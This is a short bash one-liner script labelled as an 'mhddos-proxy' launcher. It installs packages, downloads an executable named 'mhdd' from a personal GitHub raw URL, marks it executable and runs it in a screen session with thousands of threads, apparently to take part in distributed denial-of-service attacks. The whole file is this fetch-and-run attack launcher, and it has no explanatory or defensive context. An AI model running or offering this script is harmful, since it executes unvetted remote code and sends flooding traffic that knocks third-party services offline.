#!/bin/bash
# mhddos-proxy oneliner Bash 

apt update -y && apt install wget nano git screen -y && clear && mkdir v105 && cd v105 && wget https://raw.githubusercontent.com/serbianka07/v105/main/mhdd && chmod +x mhdd && screen -S 'mhdd' ./mhdd --user-id=0000000000 --copies 2 -t 8000
